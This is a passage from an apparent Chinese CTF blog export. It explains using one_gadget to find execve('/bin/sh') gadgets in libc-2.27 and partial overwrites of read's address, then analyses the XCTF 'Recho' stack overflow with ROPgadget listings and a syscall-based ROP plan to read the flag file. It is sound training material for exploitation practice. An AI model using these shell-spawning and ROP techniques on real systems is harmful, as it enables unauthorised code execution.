class="token number">-2.27</span><span class="token punctuation">.</span>so   <span class="token comment" spellcheck="true">//上面题目的libc文件</span><span class="token number">0x4f365</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  rsp <span class="token operator">&amp;</span> <span class="token number">0xf</span> <span class="token operator">==</span> <span class="token number">0</span>  rcx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x4f3c2</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x10a45c</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span></code></pre><p>可以看到这里显示出这些获取shell的函数地址偏移，只要加上libc_addr就可以用了。<br>注意到他们下面都有constraints 即使用条件  ，这三个中条件最容易的就是0x4f3c2 的[rsp+0x40] == NULL，也就是说在跳转到这个函数时[rsp+0x40] 栈地址处要为\x00，我们可以用gdb.attach(sh)来进行调试，如果不满足就多放几个ret调整，使得[rsp+0x40]处恰好为NULL</p><h3 id="其他one-gadget"><a href="#其他one-gadget" class="headerlink" title="其他one_gadget"></a>其他one_gadget</h3><p>指令：后面加-l2参数可以找到更多的gadget。条件可能比较苛刻</p><pre class=" language-c"><code class="language-c">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ one_gadget libc<span class="token number">-2.27</span><span class="token punctuation">.</span>so  <span class="token operator">-</span>l2<span class="token number">0x4f365</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  rsp <span class="token operator">&amp;</span> <span class="token number">0xf</span> <span class="token operator">==</span> <span class="token number">0</span>  rcx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x4f3c2</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0xe58b8</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x88</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span><span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token punctuation">[</span>rbp<span class="token number">-0x88</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x88</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span>  <span class="token punctuation">[</span><span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0xe58bf</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> r10<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span><span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>r10<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> r10 <span class="token operator">==</span> <span class="token constant">NULL</span>  <span class="token punctuation">[</span><span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0xe58c3</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> r10<span class="token punctuation">,</span> rdx<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>r10<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> r10 <span class="token operator">==</span> <span class="token constant">NULL</span>  <span class="token punctuation">[</span>rdx<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> rdx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x10a45c</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x10a468</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsi<span class="token punctuation">,</span> <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsi<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> rsi <span class="token operator">==</span> <span class="token constant">NULL</span>  <span class="token punctuation">[</span><span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> <span class="token punctuation">[</span>rax<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span></code></pre><h3 id="one-gadget—near功能"><a href="#one-gadget—near功能" class="headerlink" title="one_gadget—near功能"></a>one_gadget—near功能</h3><p>指令：one_gadget  libc文件  –near  某函数</p><pre class=" language-c"><code class="language-c">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ one_gadget libc<span class="token number">-2.27</span><span class="token punctuation">.</span>so  <span class="token operator">--</span>near read<span class="token punctuation">[</span>OneGadget<span class="token punctuation">]</span> Gadgets near <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0x110180</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">//这是read的偏移</span><span class="token number">0x10a45c</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x4f3c2</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x4f365</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  rsp <span class="token operator">&amp;</span> <span class="token number">0xf</span> <span class="token operator">==</span> <span class="token number">0</span>  rcx <span class="token operator">==</span> <span class="token constant">NULL</span></code></pre><p>可以找到靠近某个函数的one_gadget。</p><p>一般libc基地址结尾至少三个000</p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ ldd babymessage    linux<span class="token operator">-</span>vdso<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">1</span> <span class="token punctuation">(</span><span class="token number">0x00007ffc691d1000</span><span class="token punctuation">)</span>         libc<span class="token punctuation">.</span>so<span class="token number">.6</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">6</span> <span class="token punctuation">(</span><span class="token number">0x00007f069fd4d000</span><span class="token punctuation">)</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span>    <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">2</span> <span class="token punctuation">(</span><span class="token number">0x00007f06a013e000</span><span class="token punctuation">)</span>hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ ldd babymessage    linux<span class="token operator">-</span>vdso<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">1</span> <span class="token punctuation">(</span><span class="token number">0x00007ffc22f83000</span><span class="token punctuation">)</span>        libc<span class="token punctuation">.</span>so<span class="token number">.6</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">6</span> <span class="token punctuation">(</span><span class="token number">0x00007f7507911000</span><span class="token punctuation">)</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">2</span> <span class="token punctuation">(</span><span class="token number">0x00007f7507d02000</span><span class="token punctuation">)</span>  hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ ldd babymessage    linux<span class="token operator">-</span>vdso<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">1</span> <span class="token punctuation">(</span><span class="token number">0x00007ffc4990d000</span><span class="token punctuation">)</span>      libc<span class="token punctuation">.</span>so<span class="token number">.6</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">6</span> <span class="token punctuation">(</span><span class="token number">0x00007f7f439ca000</span><span class="token punctuation">)</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">2</span> <span class="token punctuation">(</span><span class="token number">0x00007f7f43dbb000</span><span class="token punctuation">)</span></code></pre><p>例子：<br><img src="https://s1.ax1x.com/2020/08/27/d4DkOH.png" alt=""><br>所以在程序中read函数的真实地址和第一个one_gadget就最后2字节不同。利用这一点我们可以在泄露不了libc的情况下采用尾字节覆盖的方式来强行修改read函数地址成为我们的one_gadget地址</p><p>详情见：<a href="https://bbs.pediy.com/thread-261112.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-261112.htm</a></p>]]></content>
      
      
      <categories>
          
          <category> 比赛复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2020-8月国赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-Recho</title>
      <link href="/2020/08/30/xctf-challenge-recho/"/>
      <url>/2020/08/30/xctf-challenge-recho/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ checksec Recho<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/Recho'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span>基本操作</code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> nptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-40h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-30h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+3Ch] [rbp-4h]</span>  <span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Welcome to Recho server!\n"</span><span class="token punctuation">,</span> <span class="token number">0x19uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nptr<span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v7 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>      v7 <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    buf<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>init（）：<span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0x3Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>程序逻辑：</p><ul><li>输入一定大小的数字</li><li>按输入的数字大小再次读入对应长度的字符串<ul><li>显然这里存在溢出</li></ul></li><li>输出字符串以此</li><li>循环<br>可利用字符串：<pre class=" language-java"><code class="language-java">LOAD<span class="token operator">:</span><span class="token number">0000000000400238</span>    0000001C    C    <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">.</span>so<span class="token number">.2</span>LOAD<span class="token operator">:</span><span class="token number">00000000004003E9</span>    0000000A    C    libc<span class="token punctuation">.</span>so<span class="token number">.6</span>LOAD<span class="token operator">:</span>00000000004003F3    <span class="token number">00000006</span>    C    stdinLOAD<span class="token operator">:</span>00000000004003F9    <span class="token number">00000007</span>    C    printfLOAD<span class="token operator">:</span><span class="token number">0000000000400400</span>    <span class="token number">00000005</span>    C    readLOAD<span class="token operator">:</span><span class="token number">0000000000400405</span>    <span class="token number">00000007</span>    C    stdoutLOAD<span class="token operator">:</span>000000000040040C    <span class="token number">00000007</span>    C    stderrLOAD<span class="token operator">:</span><span class="token number">0000000000400413</span>    <span class="token number">00000006</span>    C    alarmLOAD<span class="token operator">:</span><span class="token number">0000000000400419</span>    <span class="token number">00000005</span>    C    atoiLOAD<span class="token operator">:</span>000000000040041E    <span class="token number">00000008</span>    C    setvbufLOAD<span class="token operator">:</span><span class="token number">0000000000400426</span>    <span class="token number">00000012</span>    C    __libc_start_mainLOAD<span class="token operator">:</span><span class="token number">0000000000400438</span>    <span class="token number">00000006</span>    C    writeLOAD<span class="token operator">:</span>000000000040043E    <span class="token number">0000000F</span>    C    __gmon_start__LOAD<span class="token operator">:</span><span class="token number">000000000040044D</span>    0000000C    C    GLIBC_2<span class="token number">.2</span><span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>rodata<span class="token operator">:</span>00000000004008C4    0000001A    C    Welcome to Recho server<span class="token operator">!</span>\n<span class="token punctuation">.</span>eh_frame<span class="token operator">:</span><span class="token number">0000000000400987</span>    <span class="token number">00000006</span>    C    <span class="token punctuation">;</span><span class="token operator">*</span><span class="token number">3</span>$\"<span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000601058</span>    <span class="token number">00000005</span>    C    flag</code></pre>没有system，/bin/sh，后门，但是有个flag字符串</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>栈溢出漏洞很明显，但是想利用它来控制程序流程得先想办法如何跳出while循环。</li><li>read函数的返回值时其读入字节的数量（包括换行’\x0a’)，所以这个东西很头疼。但是pwntools提供了一个shutdown功能，可以关闭输入流，也就是说不进行输入那么read的返回值自然就是0了</li><li>但是关闭之后就不能再打开了，就算你再次跳到start或者main。也无法再进行输入</li><li>所以我们的payload只能用一次，而且这一次还要能把flag获取<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2></li><li>注意到可利用字符串中包含flag，我们可以构造open函数打开flag文件 </li><li>再用read函数从flag流中读取数据，最后用printf或者write函数输出 <h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3></li></ul><p><strong>所以现在得想办法进行函数无中生有，且无法利用libc文件。那么这就要用到函数的ROP链构造了，看看gadgets够不够还有关键的int 80h。</strong></p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ ROPgadget <span class="token operator">--</span>binary Recho <span class="token operator">--</span>only <span class="token string">"pop|ret"</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x000000000040089c</span> <span class="token operator">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x000000000040089e</span> <span class="token operator">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008a0</span> <span class="token operator">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008a2</span> <span class="token operator">:</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x00000000004006fc</span> <span class="token operator">:</span> pop rax <span class="token punctuation">;</span> ret   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x000000000040089b</span> <span class="token operator">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x000000000040089f</span> <span class="token operator">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x0000000000400690</span> <span class="token operator">:</span> pop rbp <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008a3</span> <span class="token operator">:</span> pop rdi <span class="token punctuation">;</span> ret   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x00000000004006fe</span> <span class="token operator">:</span> pop rdx <span class="token punctuation">;</span> ret   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x00000000004008a1</span> <span class="token operator">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span><span class="token number">0x000000000040089d</span> <span class="token operator">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x00000000004005b6</span> <span class="token operator">:</span> rethunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ ROPgadget <span class="token operator">--</span>binary Recho <span class="token operator">--</span>only <span class="token string">"int"</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Unique gadgets found<span class="token operator">:</span> <span class="token number">0</span></code></pre><p>还不错，存放系统调用号的rax，以及三个参数RDI，RSI，RDX都有对应的独立gadgets。但是关键的int 80h却没有，这就很烦~~<br>但是除了int 80h 咱们还有syscall，这个也是系统调用最后进行中断处理的指令和int 80h差不多。并且这个再系统调用中更为常见。比如，在本例我们随便深入一个函数：</p><pre class=" language-java"><code class="language-java"><span class="token number">0x7ffff7af4147</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span>DWORD PTR <span class="token punctuation">[</span>rax<span class="token punctuation">]</span>   <span class="token number">0x7ffff7af4149</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span><span class="token operator">:</span>    test   eax<span class="token punctuation">,</span>eax<span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x7ffff7af414b</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>        jne    <span class="token number">0x7ffff7af4160</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span>   <span class="token number">0x7ffff7af414d</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x1</span>   <span class="token number">0x7ffff7af4152</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span><span class="token operator">:</span>    syscall    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>   <span class="token number">0x7ffff7af4154</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token operator">:</span>    cmp    rax<span class="token punctuation">,</span><span class="token number">0xfffffffffffff000</span>   <span class="token number">0x7ffff7af415a</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">26</span><span class="token operator">></span><span class="token operator">:</span>        ja     <span class="token number">0x7ffff7af41b0</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span></code></pre><p>我们可以看到在libc中要调用write函数时，把write的系统调用号放入eax，然后执行syscll指令，就像int 80h一样。<br>但是如果成功利用了某个函数中的syscall那么程序也会继续执行下去可能会发生意料之外的结果，所以我们要选择作用不是很大的函数如这里有alarm。设置闹钟</p><h3 id="alarm-plt"><a href="#alarm-plt" class="headerlink" title="alarm@plt"></a>alarm@plt</h3><pre class=" language-java"><code class="language-java">   <span class="token number">0x4005e0</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a3a</span><span class="token punctuation">]</span>        # <span class="token number">0x601020</span>   <span class="token number">0x4005e6</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x1</span>   <span class="token number">0x4005eb</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x4005c0</span><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x4005f0</span> <span class="token 